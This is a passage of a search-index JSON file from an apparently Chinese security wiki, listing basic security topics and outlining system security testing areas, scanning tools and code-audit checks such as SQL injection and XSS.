\u53d1\u4eba\u5458\u53ef\u4ee5\u521b\u5efa\u81ea\u5df1\u7684\u8bc1\u4e66\u5e76\u4e3a\u5e94\u7528\u7a0b\u5e8f\u7b7e\u540d\u3002 \u5728 Apple \u7684 iOS \u5e94\u7528\u7a0b\u5e8f\u6a21\u578b\u4e2d\u53ef\u4ee5\u770b\u5230 CA \u7b7e\u540d\uff0c\u5176\u4e2d\u5f00\u53d1\u8005\u4e0a\u4f20\u5230 App Store \u7684\u6bcf\u4e2a\u5e94 \u7528\u7a0b\u5e8f\u90fd\u7ecf\u8fc7\u9a8c\u8bc1\uff0c\u7136\u540e\u7531 Apple \u7684\u8bc1\u4e66\u7b7e\u540d\u3002 \u4e00\u65e6\u4e0b\u8f7d\u5230\u8bbe\u5907\uff0c\u8bbe\u5907\u5c06\u9a8c\u8bc1\u5e94\u7528\u7a0b\u5e8f\u662f\u5426 \u7531 Apple \u7684 CA \u7b7e\u540d\uff0c\u7136\u540e\u624d\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u3002","title":"1.4 \u5e94\u7528\u7b7e\u540d"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/","text":"CIA\u4e09\u5143\u7ec4 \u00b6 HTTPS\u5b9e\u73b0\u539f\u7406 \u00b6 3389\u65e0\u6cd5\u8fde\u63a5 \u00b6 arp\u5de5\u4f5c\u539f\u7406\u548c\u6b3a\u9a97 \u00b6 syn\u6d2a\u6d41 \u00b6 \u4f2a\u9020ip\u53d1\u9001\uff0csyn\u62a5 cc\u653b\u51fb \u00b6 \u540c\u6e90\u7b56\u7565 \u00b6 tcp\u4e09\u6b21\u63e1\u624b \u00b6 tcp\u548cudp\u533a\u522b \u00b6 \u591a\u7ebf\u7a0b\u591a\u8fdb\u7a0b \u00b6 ntlm\u539f\u7406 \u00b6 \u4e2d\u95f4\u4eba\u653b\u51fb\u624b\u6cd5\u53ca\u9632\u5fa1 \u00b6 pki \u516c\u53f8\u7f51\u7edc\u5b89\u5168\u5177\u4f53\u662f\u6307 \u00b6 \u5224\u65ad\u8ba1\u7b97\u673a\u79cd\u9a6c \u00b6 \u6728\u9a6c\u4f20\u64ad\u9014\u5f84 \u00b6 \u6076\u610f\u8f6f\u4ef6 \u00b6 \u7f51\u9875\u6302\u9a6c \u00b6 \u7535\u5b50\u90ae\u4ef6\u75c5\u6bd2 \u00b6 \u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u7684\u98ce\u9669 \u00b6 icmp\u534f\u8bae \u00b6 \u9632\u706b\u5899\u7684\u7c7b\u522b\u539f\u7406 \u00b6 \u8fc7\u6ee4\u3001\u5e94\u7528\u4ee3\u7406\u3001\u72b6\u6001\u68c0\u6d4b\u3001\u9ad8\u7ea7\u5e94\u7528 http\u54cd\u5e94\u72b6\u6001 \u00b6 cookie\u548csession \u00b6 get\u548cpost\u7684\u533a\u522b \u00b6 https\u548chttp \u00b6 http\u957f\u8fde\u63a5\u77ed\u8fde\u63a5 osi\u4e03\u5c42\u6a21\u578b \u00b6 SSL\u5de5\u4f5c\u539f\u7406 \u00b6","title":"\u5b89\u5168\u57fa\u7840"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#cia","text":"","title":"CIA\u4e09\u5143\u7ec4"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#https","text":"","title":"HTTPS\u5b9e\u73b0\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#3389","text":"","title":"3389\u65e0\u6cd5\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#arp","text":"","title":"arp\u5de5\u4f5c\u539f\u7406\u548c\u6b3a\u9a97"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#syn","text":"\u4f2a\u9020ip\u53d1\u9001\uff0csyn\u62a5","title":"syn\u6d2a\u6d41"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#cc","text":"","title":"cc\u653b\u51fb"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_1","text":"","title":"\u540c\u6e90\u7b56\u7565"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#tcp","text":"","title":"tcp\u4e09\u6b21\u63e1\u624b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#tcpudp","text":"","title":"tcp\u548cudp\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_2","text":"","title":"\u591a\u7ebf\u7a0b\u591a\u8fdb\u7a0b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#ntlm","text":"","title":"ntlm\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_3","text":"pki","title":"\u4e2d\u95f4\u4eba\u653b\u51fb\u624b\u6cd5\u53ca\u9632\u5fa1"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_4","text":"","title":"\u516c\u53f8\u7f51\u7edc\u5b89\u5168\u5177\u4f53\u662f\u6307"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_5","text":"","title":"\u5224\u65ad\u8ba1\u7b97\u673a\u79cd\u9a6c"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_6","text":"","title":"\u6728\u9a6c\u4f20\u64ad\u9014\u5f84"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_7","text":"","title":"\u6076\u610f\u8f6f\u4ef6"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_8","text":"","title":"\u7f51\u9875\u6302\u9a6c"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_9","text":"","title":"\u7535\u5b50\u90ae\u4ef6\u75c5\u6bd2"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_10","text":"","title":"\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u7684\u98ce\u9669"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#icmp","text":"","title":"icmp\u534f\u8bae"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#_11","text":"\u8fc7\u6ee4\u3001\u5e94\u7528\u4ee3\u7406\u3001\u72b6\u6001\u68c0\u6d4b\u3001\u9ad8\u7ea7\u5e94\u7528","title":"\u9632\u706b\u5899\u7684\u7c7b\u522b\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#http","text":"","title":"http\u54cd\u5e94\u72b6\u6001"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#cookiesession","text":"","title":"cookie\u548csession"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#getpost","text":"","title":"get\u548cpost\u7684\u533a\u522b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#httpshttp","text":"http\u957f\u8fde\u63a5\u77ed\u8fde\u63a5","title":"https\u548chttp"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#osi","text":"","title":"osi\u4e03\u5c42\u6a21\u578b"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#ssl","text":"","title":"SSL\u5de5\u4f5c\u539f\u7406"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/","text":"1. *\u5b89\u5168\u6d4b\u8bd5\u5728\u505a\u4ec0\u4e48\uff1f* \u00b6 \u626b\u63cf\uff1f\u5728\u5f88\u591a\u4eba\u7684\u773c\u4e2d\uff0c\u505a\u5b89\u5168\u7684\u5c31\u662f\u6574\u5929\u62ff\u4e2a\u5de5\u5177\u5728\u54ea\u91cc\u505a\u626b\u63cf\u64cd\u4f5c\uff0c\u4f7f\u7528\u5404\u79cd\u4e0d\u540c\u7684\u5de5\u5177\u505a\u626b\u63cf\u3002\u662f\u7684\uff0c\u626b\u63cf\u662f\u5b89\u5168\u6d4b\u8bd5\u7684\u5f88\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u626b\u63cf\u53ef\u4ee5\u5feb\u901f\u6709\u6548\u7684\u53d1\u73b0\u95ee\u9898\u3002\u626b\u63cf\u5de5\u5177\u7684\u6613\u7528\u6027\u3001\u65b9\u4fbf\u6027\u51b3\u5b9a\u4e86\u91cd\u8981\u5730\u4f4d\u3002\u4f46\u662f\u626b\u63cf\u5de5\u5177\u7684\u5c40\u9650\u6027\u3001\u7a0b\u5e8f\u7684\u4e0d\u591f\u7075\u6d3b\u7b49\u7f3a\u70b9\u4e5f\u662f\u663e\u800c\u6613\u89c1\u7684\u3002\u4e0d\u7ba1\u662f\u626b\u63cf\u62a5\u544a\u7684\u5206\u6790\u3001\u6f0f\u6d1e\u7684\u6df1\u5ea6\u6316\u6398\u3001\u6d4b\u8bd5\u7684\u7ec4\u7ec7\u7b49\u7b49\u7684\u5de5\u4f5c\u90fd\u79bb\u4e0d\u5f00\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\uff0c\u6240\u4ee5\u53ea\u80fd\u8bf4\u626b\u63cf\u5de5\u5177\u51cf\u8f7b\u4e86\u6d4b\u8bd5\u4eba\u5458\u7684\u5de5\u4f5c\u91cf\uff0c\u662f\u5b89\u5168\u6d4b\u8bd5\u7684\u4e00\u79cd\u624b\u6bb5\u3002 2. *\u5b89\u5168\u6d4b\u8bd5\u8005\u662f\u600e\u6837\u5b9a\u4f4d\u81ea\u5df1\u7684\uff1f* \u00b6 \u6211\u4eec\u7ecf\u5e38\u53ef\u4ee5\u4ece\u8eab\u8fb9\u7684\u670b\u53cb\u53e3\u4e2d\u542c\u5230\u4e00\u4e9b\u6709\u5173\u5b89\u5168\u7684\u540d\u79f0\uff0c\u5411\u4ec0\u4e48\u8f6f\u4ef6\u5b89\u5168\u3001\u4fe1\u606f\u5b89\u5168\u3001\u7f51\u7edc\u5b89\u5168\u3001\u8ba1\u7b97\u673a\u5b89\u5168\u7b49\u4e00\u4e9b\u8bcd\u7ec4\uff0c\u8fd9\u4e9b\u9886\u57df\u90fd\u662f\u505a\u5b89\u5168\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u5c5e\u4e8e\u54ea\u4e00\u4e2a\u5462\uff1f \u5927\u5bb6\u53ef\u4ee5\u4e0a\u767e\u5ea6\u767e\u79d1\u67e5\u770b\u4e0b\u8fd9\u4e9b\u8bcd\u7ec4\u7684\u6982\u5ff5\u3002\u8f6f\u4ef6\u5b89\u5168\u5f80\u5c0f\u4e86\u8bf4\u5c31\u662f\u67d0\u4e00\u4e2a\u8f6f\u4ef6\u4ea7\u54c1\uff0c\u8bf4\u5927\u4e86\u9664\u4e86\u786c\u4ef6\u5c31\u662f\u8f6f\u4ef6\u4e86\u554a\u3002\u4fe1\u606f\u5b89\u5168\u770b\u540d\u5b57\u6211\u4eec\u5c31\u77e5\u9053\u5173\u952e\u662f\u4fe1\u606f\u4e24\u4e2a\u5b57\uff0c\u4f46\u662f\u4ec0\u4e48\u662f\u4fe1\u606f\u5462\uff0c\u5ba2\u6237\u7684\u6570\u636e\u8fd8\u662f\u4e00\u5207\u6709\u7528\u7684\u6570\u636e\uff1f\u7f51\u7edc\u5b89\u5168\uff0c\u4ec0\u4e48\u662f\u7f51\u7edc\uff0c\u7f51\u7edc\u7cfb\u7edf\u786c\u4ef6\u3001\u8f6f\u4ef6\u8fd9\u90fd\u662f\u5199\u6a21\u7cca\u7684\u53ef\u5927\u53ef\u5c0f\u7684\u6982\u5ff5\u3002\u5728\u770b\u8ba1\u7b97\u673a\u5b89\u5168\uff0cPC\uff1f\u670d\u52a1\u5668\uff1f\u8def\u7531\u5668\uff1f\u597d\u5427\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u6982\u5ff5\u5f80\u5927\u4e86\u8bf4\u5c31\u6210\u4e86\u7ec4\u6210\u6211\u4eec\u4eca\u5929\u4e92\u8054\u7f51\u7684\u5404\u79cd\u8bbe\u5907\u5305\u62ec\u5404\u79cd\u7684\u5d4c\u5165\u5f0f\u673a\u5668\u3001\u5916\u63a5USB\u3001\u84dd\u7259\u7b49\u8bbe\u5907\u7684\u5171\u540c\u4f53\u7684\u786c\u8f6f\u4ef6\uff0c\u4ee5\u53ca\u4f7f\u7528\u3001\u7ef4\u62a4\u3001\u7ba1\u7406\u7b49\u8fd9\u4e9b\u4e1c\u897f\u7684\u4eba\u7684\u6574\u4e2a\u7684\u5b89\u5168\u95ee\u9898\u3002\u5728\u770b\u4ed6\u4eec\u7684\u533a\u522b\uff0c\u4ed6\u4eec\u5df2\u4e0d\u540c\u7684\u5730\u65b9\u4f5c\u4e3a\u5176\u4e3b\u8981\u5173\u6ce8\u70b9\uff0c\u6216\u8005\u8bf4\u51fa\u53d1\u70b9\uff0c\u4ed6\u4eec\u5e76\u6ca1\u6709\u660e\u663e\u7684\u754c\u7ebf\u5374\u6709\u7740\u81ea\u5df1\u7684\u4fa7\u91cd\u70b9\u3002\u800c\u6211\u4eec\u7684\u4fa7\u91cd\u70b9\u662f\u4ec0\u4e48\u5462\uff0c\u6211\u4eec\u4ea7\u54c1\u662f\u4e00\u4e2a\u4ec0\u4e48\u6837\u7684\u4ea7\u54c1\u5462\uff1f\u6211\u4eec\u6709WEB\u670d\u52a1\u3001\u63a5\u53e3\u670d\u52a1\u3001\u6587\u4ef6\u670d\u52a1\u3001\u89c6\u5c4f\u7b49\u670d\u52a1\u7b49\u6211\u4eec\u628a\u5b83\u4eec\u7edf\u4e00\u79f0\u4e3a\u6211\u4eec\u7684\u7cfb\u7edf\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u662f\u5728\u505a\u8fd9\u4e2a\u7cfb\u7edf\u7684\u5b89\u5168\u6d4b\u8bd5\uff0c\u6240\u4ee5\u6211\u89c9\u5f97\u6211\u4eec\u5e94\u8be5\u5b9a\u4f4d\u4e3a\u7cfb\u7edf\u5b89\u5168\u6d4b\u8bd5\u3002 \u5f53\u7136\u6211\u4eec\u7684\u7cfb\u7edf\u8fd0\u884c\u4e2d\u4e5f\u6d89\u53ca\u5230\u4eba\u3001\u6d89\u53ca\u5230\u786c\u4ef6\uff0c\u6b64\u5904\u90fd\u4e0d\u662f\u6211\u4eec\u7684\u5173\u6ce8\u70b9\uff0c\u6211\u4eec\u53ea\u4ece\u8f6f\u4ef6\u6280\u672f\u7684\u89d2\u5ea6\u6765\u8bc6\u522b\u5b83\u3002\u90a3\u4e48\uff0c\u7cfb\u7edf\u5b89\u5168\u6d4b\u8bd5\u5c31\u6210\u4e86\u533a\u522b\u4e8e\u529f\u80fd\u6d4b\u8bd5\uff0c\u548c\u6027\u80fd\u6d4b\u8bd5\u4e00\u6837\uff0c\u5355\u72ec\u5217\u51fa\u6765\u7684\u4e13\u9879\u6d4b\u8bd5\u4e86\u3002 3. *\u5b89\u5168\u7684\u672c\u8d28\u662f\u4ec0\u4e48\uff1f* \u00b6 \u4fe1\u4efb\u3001\u4eba\u6027\uff08\u7f51\u7edc\u5b89\u5168\u7684\u6700\u5927\u6f0f\u6d1e\u662f\u4eba\uff09\u3001\u6b62\u635f\u3001\u653b\u9632 \u4ee5\u4e0a\u662f\u5f53\u524d\u7f51\u4e0a\u4e00\u4e9b\u4e3b\u8981\u7684\u8bba\u70b9\uff0c\u4ee5\u4fe1\u4efb\u6216\u8005\u4e0d\u4fe1\u4efb\u4f5c\u4e3a\u672c\u8d28\u51fa\u53d1\u70b9\u7684\u8fd8\u662f\u5360\u636e\u4e3b\u6d41\u7684\u3002 4. *\u6982\u5ff5\u5b9a\u4e49* \u00b6 \u654f\u611f\u6570\u636e\uff1a \u654f\u611f\u6570\u636e\u7684\u5177\u4f53\u8303\u56f4\u53d6\u51b3\u4e8e\u4ea7\u54c1\u5177\u4f53\u7684\u5e94\u7528\u573a\u666f\uff0c\u4ea7\u54c1\u5e94\u6839\u636e\u98ce\u9669\u8fdb\u884c\u5206\u6790\u548c\u5224\u65ad\u3002\u5178\u578b\u7684\u654f\u611f\u6570\u636e\u5305\u62ec\u53e3\u4ee4\u3001\u94f6\u884c\u5e10\u53f7\u3001\u5927\u6279\u91cf\u4e2a\u4eba\u6570\u636e\u3001\u7528\u6237\u901a\u4fe1\u5185\u5bb9\u548c\u5bc6\u94a5\u7b49\u3002 \u4e2a\u4eba\u6570\u636e\uff1a \u6307\u76f4\u63a5\u901a\u8fc7\u8be5\u6570\u636e\u6216\u8005\u7ed3\u5408\u8be5\u6570\u636e\u4e0e\u5176\u4ed6\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u8bc6\u522b\u51fa\u81ea\u7136\u4eba\u7684\u4fe1\u606f\u3002 \u533f\u540d\u5316\uff1a \u6307\u5bf9\u4e2a\u4eba\u6570\u636e\u8fdb\u884c\u7684\u66f4\u6539\uff08\u4f8b\u5982\u5355\u5411\u6563\u5217\u3001\u622a\u77ed\u3001\u66ff\u6362\u7b49\uff0c\u5982\u9700\u4fdd\u7559\u4e2a\u4eba\u6570\u636e\u771f\u5b9e\u503c\u4e0e\u66ff\u6362\u503c\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u53ef\u4ee5\u4f7f\u7528\u5bf9\u79f0\u52a0\u5bc6\u6216\u6620\u5c04\u8868\u65b9\u5f0f\uff0c\u4f46\u5bc6\u94a5/\u6620\u5c04\u8868\u5fc5\u987b\u7531\u6570\u636e\u6240\u6709\u8005\u63a7\u5236\uff09\uff0c\u4f7f\u539f\u6765\u6709\u5173\u4e2a\u4eba\u7684\u4fe1\u606f\u4e0d\u518d\u80fd\u5f52\u5c5e\u5230\u4e00\u4e2a\u53ef\u8bc6\u522b\u7684\u81ea\u7136\u4eba\uff0c\u6216\u63a8\u7406\u8fd9\u79cd\u5f52\u5c5e\u9700\u8981\u8017\u8d39\u8fc7\u591a\u3001\u4e0d\u76f8\u79f0\u7684\u65f6\u95f4\u3001\u8d39\u7528\u548c\u7cbe\u529b 5. *\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u53bb\u7740\u624b* \u00b6 \u5982\u4f55\u7740\u624b\u53bb\u505a\u8fd9\u4e2a\u7cfb\u7edf\u5b89\u5168\u6d4b\u8bd5\u5462\uff1f\u4f5c\u4e3a\u4e00\u4e2a\u6d4b\u8bd5\u4eba\u5458\u8981\u4fdd\u8bc1\u7cfb\u7edf\u6574\u4f53\u7684\u5b89\u5168\uff0c\u8fd9\u5c31\u9700\u8981\u6709\u4e00\u4e2a\u6574\u4f53\u7684\u7ed3\u6784\u7684\u6846\u67b6\uff0c\u5c31\u50cf\u76d6\u623f\u5b50\u4e00\u6837\uff0c\u5148\u9020\u94a2\u7b4b\u6df7\u51dd\u571f\u6846\u67b6\uff0c\u7136\u540e\u7816\u5757\u53bb\u586b\u5145\u5b83\u3002\u8fd9\u91cc\u7684\u94a2\u7b4b\u6df7\u51dd\u571f\u6846\u67b6\u5c31\u662f\u5b89\u5168\u7279\u6027\u65b9\u5411\uff0c\u5176\u5b9e\u5c31\u662f\u4ece\u6574\u4f53\u65b9\u5411\u4e0a\u7684\u4e00\u4e2a\u5212\u5206\uff0c\u53ef\u4ee5\u6709\u5982\u4e0b\u7b80\u5355\u7684\u5212\u5206\u3002 5.1. *\u6d4b\u8bd5\u7684**** *\u7279\u6027**** \u00b6 \u5b89\u5168\u7279\u6027\uff1a\u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u3001\u6570\u636e\u5e93\u5b89\u5168\u3001WEB\u5b89\u5168\u3001\u8f6f\u4ef6\u7684\u53d1\u5e03\u548c\u5b89\u88c5\u5b89\u5168\u3001\u534f\u8bae\u4e0e\u63a5\u53e3\u653b\u9632\u3001\u654f\u611f\u6570\u636e\u4fdd\u62a4\u3001\u624b\u673a\u7aef\u5b89\u5168\u3001\u9759\u6001\u4ee3\u7801\u5206\u6790\u3002 5.1.1. *\u64cd\u4f5c\u7cfb\u7edf**** *\u5b89\u5168**** \u00b6 \u64cd\u4f5c\u7cfb\u7edf\u5b89\u5168\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u5206\u4e3a\u4ee5\u4e0b\u51e0\u5757\uff1a \u7cfb\u7edf\u6f0f\u6d1e\uff08\u64cd\u4f5c\u7cfb\u7edf\u8865\u4e01\uff09\u3001\u7cfb\u7edf\u914d\u7f6e\uff08\u5b89\u5168\u52a0\u56fa\uff09 \u4e1a\u754c\u6743\u5a01\u5de5\u5177Nessus\uff0c\u5176\u4ed6\u5982retina\u3001\u7eff\u76df\u3001\u5929\u955c\u7b49\u3002\u5f00\u6e90\u7684\u5de5\u5177\u53ef\u4ee5\u4f7f\u7528OpenVAS\u3002 5.1.2. *\u6570\u636e\u5e93* \u00b6 \u6570\u636e\u5e93\u5b89\u5168\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u5206\u4e3a\u4ee5\u4e0b\u51e0\u5757\uff1a \u6570\u636e\u5e93\u6f0f\u6d1e\uff08\u8865\u4e01\uff09\u3001\u6570\u636e\u5e93\u914d\u7f6e\uff08\u5b89\u5168\u52a0\u56fa\uff09 \u5de5\u5177\u53ef\u4ee5\u4f7f\u7528Ngs 5.1.3. *web\u5b89\u5168* \u00b6 \u6570\u636e\u5e93\u5b89\u5168\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u5206\u4e3a\u4ee5\u4e0b\u51e0\u5757\uff1a \u8eab\u4efd\u9a8c\u8bc1\u3001\u9a8c\u8bc1\u7801\u3001\u4f1a\u8bdd\u7ba1\u7406\u3001\u6743\u9650\u7ba1\u7406\u3001\u654f\u611f\u4fe1\u606f\u4f20\u8f93\u3001\u5b89\u5168\u5ba1\u8ba1\u3001\u4fe1\u606f\u6cc4\u9732\u3001\u8f93\u5165\u6821\u9a8c\u3001\u8f93\u51fa\u7f16\u7801\u3001\u4e0a\u4f20\u4e0b\u8f7d\u3001\u5f02\u5e38\u5904\u7406\u3001\u6ce8\u91ca\u4ee3\u7801\u7b49 \u5bb9\u5668\u7684\u5b89\u5168\uff08tomcat\uff09 \u5e94\u7528\u8f6f\u4ef6\u5b89\u5168\uff08nginx\u3001\u8d1f\u8f7d\u5747\u8861\u8f6f\u4ef6\u3001jquery\u7b49\uff09 \u626b\u63cf\u5de5\uff1aappScan\u3001awvs 5.1.4. *\u8f6f\u4ef6\u7684\u53d1\u5e03\u4e0e\u5b89\u88c5\u5b89\u5168* \u00b6 \u53d1\u5e03\u4ef6\u7684\u5b8c\u6574\u6027\u6821\u9a8c\uff08\u7b7e\u540d\u3001\u54c8\u5e0c\uff09 \u9632\u75c5\u6bd2\uff1a\u9700\u8981\u5b89\u88c5\u7684\u8f6f\u4ef6\u9700\u8981\u7ecf\u8fc7\u5e38\u7528\u7684\u6740\u6bd2\u8f6f\u4ef6\uff08\u5982360\u3001\u5361\u5df4\u65af\u57fa\u3001\u91d1\u5c71\u6bd2\u9738\u7b49\uff09\u7684\u626b\u63cf\uff0c\u4fdd\u8bc1\u6ca1\u6709\u75c5\u6bd2\u7279\u79cd\u7801\uff0c\u4ee5\u514d\u88ab\u6740\u8f6f\u5904\u7406\u6389\u3002 5.1.5. *\u534f\u8bae\u4e0e\u63a5\u53e3\u653b\u9632* \u00b6 \u4e1a\u52a1\u4ea4\u4e92\u6570\u636e\u5728\u7f51\u7edc\u4e2d\u4f7f\u7528\u7684\u534f\u8bae\u5b89\u5168\u6027\u6d4b\u8bd5 \u534f\u8bae\u6d4b\u8bd5\u5de5\u5177\uff1acodenomical \u5bf9\u5916\u5f00\u653e\u7684\u7aef\u53e3:\u7cfb\u7edf\u5bf9\u5916\u5f00\u653e\u7684\u7aef\u53e3\u5fc5\u987b\u662f\u5fc5\u987b\u7684\uff0c\u7981\u6b62\u5f00\u653e\u65e0\u7528\u7aef\u53e3 \u7aef\u53e3\u626b\u63cf\u5de5\u5177\uff1aNmap\uff0c\u8fd1\u7aef\u53ef\u4ee5\u76f4\u63a5\u5728\u670d\u52a1\u5668\u4e0a\u4f7f\u7528\u547d\u4ee4\u67e5\u770b \u63a5\u53e3\uff1a\u63a5\u53e3\u63a5\u53d7\u7684\u6570\u636e\u9700\u8981\u505a\u4e25\u683c\u7684\u5904\u7406 \u63a5\u53e3\u6570\u636e\u4e25\u683c\u6821\u9a8c\u6d4b\u8bd5 5.1.6. *\u654f\u611f\u6570\u636e\u4fdd\u62a4* \u00b6 \u8bc6\u522b\u654f\u611f\u6570\u636e\uff1a\u5bc6\u7801\u3001\u79d8\u94a5\u3001\u4f1a\u8bdd\u6807\u8bc6\uff1b\u4e2a\u4eba\u4fe1\u606f\u3001\u5546\u4e1a\u673a\u5bc6\u3001\u5ba2\u6237\u4fe1\u606f\u7b49 \u4fdd\u62a4\uff1a\u52a0\u5bc6\u3001\u5b58\u50a8\u4f4d\u7f6e\u3001\u4f20\u8f93\u65b9\u5f0f\uff1b\u83b7\u53d6\u6570\u636e\u8131\u654f\u3001\u533f\u540d\u5316 5.1.7. *\u624b\u673a\u7aef\u5b89\u5168* \u00b6 1\u3001app\u7684\u7b7e\u540d\u3001\u53cd\u9006\u5411 2\u3001\u7528\u6237\u9690\u79c1 3\u3001\u6587\u4ef6\u6743\u9650 4\u3001\u7f51\u7edc\u901a\u8baf 5\u3001\u8fd0\u884c\u65f6\u89e3\u91ca\u4fdd\u62a4 6\u3001\u7ec4\u4ef6\u6743\u9650\u4fdd\u62a4 7\u3001\u5347\u7ea7 8\u30013rd\u5e93 \u79fb\u52a8APP\u6d4b\u8bd5\u8981\u70b9\uff1a http://blog.nsfocus.net/mobile-app-security-security-test/ 5.1.8. *\u9759\u6001\u4ee3\u7801\u5206\u6790\uff08\u7eaf\u767d\u76d2\uff09* \u00b6 \u767d\u76d2\u6d4b\u8bd5\u4e3b\u8981\u662f\u901a\u8fc7\u5bf9\u4ee3\u7801\u7684\u6d4f\u89c8\u6765\u53d1\u73b0\u95ee\u9898\uff0c\u5f53\u7136\u95ee\u9898\u7684\u7c7b\u578b\u53ef\u80fd\u662f\u8ddf\u6211\u4eec\u9ed1\u7070\u76d2\u603b\u7ed3\u7684\u4e00\u81f4\uff0c\u62ff\u51fa\u6765\u5355\u72ec\u8bb2\u662f\u56e0\u4e3a\u5176\u4e0d\u540c\u4e8e\u5176\u4ed6\u7684\u6d4b\u8bd5\u65b9\u5f0f\u3002 1\u3001\u5371\u9669\u51fd\u6570\u3001\u65b9\u6cd5 2\u3001\u5de5\u5177\u68c0\u6d4b 3\u3001\u903b\u8f91\u6f0f\u6d1e \u7070\u76d2 \u7ed3\u5408\u767d\u76d2\u548c\u9ed1\u76d2\u7684\u4e00\u4e9b\u601d\u8def\uff0c\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u5ba1\u8ba1\u4e2d\u5efa\u8bae\u91c7\u7528\u7070\u76d2\u7684\u65b9\u5f0f\uff0c\u5728\u9700\u8981\u7684\u5730\u65b9\u5bf9\u4ee3\u7801\u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\u67e5\u770b\u3002\u5ba1\u8ba1\u4e2d\u601d\u8def\u53ef\u4ee5\u8003\u8651\u5982\u4e0b\u8fd9\u4e9b\u90e8\u5206\uff1a 1\u3001\u6d89\u53ca\u654f\u611f\u6570\u636e\u7684\u65f6\u5019\uff0c\u68c0\u67e5\u662fget\u3001post\u54ea\u79cd\u5f62\u5f0f\u53d1\u9001\u6570\u636e Get\u4f20\u8f93\u7684\u6570\u636e\u4f1a\u88ab\u8bb0\u5f55\u5728\u4ee3\u7406\u3001\u6d4f\u89c8\u5668\u3001web\u5bb9\u5668tomcat\u7b49\u7684\u65e5\u5fd7\u4e2d 2\u3001\u63d0\u4ea4\u94ed\u611f\u6570\u636e\u7684\u65f6\u5019\u662f\u5426\u6709\u9632\u6b62csrf\u7684token\u3001refer\u3001\u9a8c\u8bc1\u7801\u7b49 3\u3001sql\u6ce8\u5165 \u200b 1\uff09Statement\u548cpreparestatement \u200b 2\uff09mybitas\u6846\u67b6 #\u548c$ 4\u3001XSS 